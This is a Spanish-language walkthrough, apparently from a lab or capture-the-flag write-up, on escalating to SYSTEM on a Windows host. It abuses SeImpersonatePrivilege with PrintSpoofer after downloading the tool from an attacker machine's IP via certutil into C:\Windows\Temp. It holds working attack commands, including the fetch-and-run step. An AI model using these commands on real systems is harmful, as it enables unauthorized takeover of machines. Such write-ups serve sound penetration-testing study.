# Escalada de privilegios
Como mencione anteriormente, una vez obtenido el acceso inicial, comenzamos la enumeración local de la máquina con el objetivo de identificar permisos, configuraciones inseguras y posibles vectores de escalada de privilegios.

## Enumeración del usuario

```cmd
whoami
whoami /priv
whoami /groups
```

Al enumerar los privilegios del contexto actual mediante `whoami /priv`, identificamos los siguientes privilegios habilitados:

## Enumeracion del usuario

```cmd
systeminfo
hostname
```
El privilegio que resulta relevante para nuestra escalada es:

```text
SeImpersonatePrivilege → Enabled
```
Este privilegio puede ser abusado desde un contexto de servicio para obtener un token con privilegios elevados. En este caso utilizaremos PrintSpoofer para realizar la suplantación y obtener una shell con privilegios de SYSTEM.

## Transferencia de archivos 

Para transferir el archivo desde nuestra máquina atacante hasta nuestra sesión lo primero que tenemos que hacer es crear un servidor local en kali usando python en cualquier puerto:

```
python3 -m http.server 8080
```

## Desde la sesión activa en nuestro windows victima

Descargamos el archivo con el siguiente comando: 

```
certutil -urlcache -split -f http://192.168.179.220:8080/PrintSpoofer64.exe C:\Windows\Temp\ps.exe

```

## ¿Por qué enviar el archivo a `Temp`?

Utilizamos `C:\Windows\Temp` porque es un directorio destinado al almacenamiento temporal de archivos y, normalmente, permite la escritura por usuarios y procesos con permisos limitados. Esto facilita transferir y ejecutar herramientas durante la explotación sin modificar directamente directorios críticos del sistema.

## Ejecución de printspoofer y escalación de privilegios 

```
C:\Windows\Temp\ps.exe -i -c cmd.exe
```

Verificación de escalada:

```cmd
whoami
# nt authority\system
```




